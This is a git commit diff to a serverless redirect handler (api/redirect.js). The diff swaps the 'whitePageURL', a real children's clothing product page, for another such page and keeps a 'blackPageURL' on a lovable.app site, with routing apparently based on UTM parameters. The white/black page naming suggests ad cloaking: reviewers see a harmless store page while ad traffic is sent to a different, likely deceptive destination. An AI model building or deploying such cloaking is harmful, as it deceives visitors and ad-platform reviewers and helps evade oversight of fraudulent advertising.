2d5b5bf5dea2ad18dafbe43a5fc9ed06b7f7ca6e
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-16 16:55:59 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://snugglehunnykids.com/products/vintage-cars-organic-jersey-wrap-beanie-set";
+    const whitePageURL = "https://sunnyafternoonkids.com.au/products/the-lulu-dress-muslin?pr_prod_strat=e5_desc&pr_rec_id=5f84f0df8&pr_rec_pid=8426018210017&pr_ref_pid=8821155102945&pr_seq=uniform";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
